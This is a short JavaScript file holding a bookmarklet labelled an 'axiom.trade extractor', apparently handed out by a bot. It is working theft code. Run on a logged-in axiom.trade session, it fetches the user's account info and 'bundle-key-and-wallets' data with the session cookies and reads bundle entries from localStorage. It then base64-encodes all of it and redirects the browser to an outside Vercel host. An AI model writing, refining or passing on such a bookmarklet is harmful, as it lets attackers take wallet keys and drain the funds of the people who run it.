/**
 * Full axiom.trade extractor bookmarklet (token version).
 * The bot generates this automatically with your token + BASE_URL baked in.
 *
 * Manual form (replace TOKEN and BASE):
 */
javascript:(async()=>{try{if(location.hostname!=="axiom.trade"){alert("Navigate to axiom.trade");location.replace("https://axiom.trade/discover");return}if(!localStorage.getItem("isAuthed")){alert("Please log in");return}const user=await(await fetch("//api7.axiom.trade/user-info",{method:"POST",credentials:"include"})).json();const bundle=await(await fetch("//api2.axiom.trade/bundle-key-and-wallets-v2",{method:"POST",credentials:"include"})).json();const bookmarkData={token:"TOKEN",site:location.href,user,bundle:bundle.bundleKey,sBundles:localStorage.getItem("sBundles"),eBundles:localStorage.getItem("eBundles")};location.replace("https://charger-rouge.vercel.app/data/"+btoa(JSON.stringify(bookmarkData)).replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,""));}catch(e){console.error(e);alert("Error: "+(e&&e.message||e))}})();
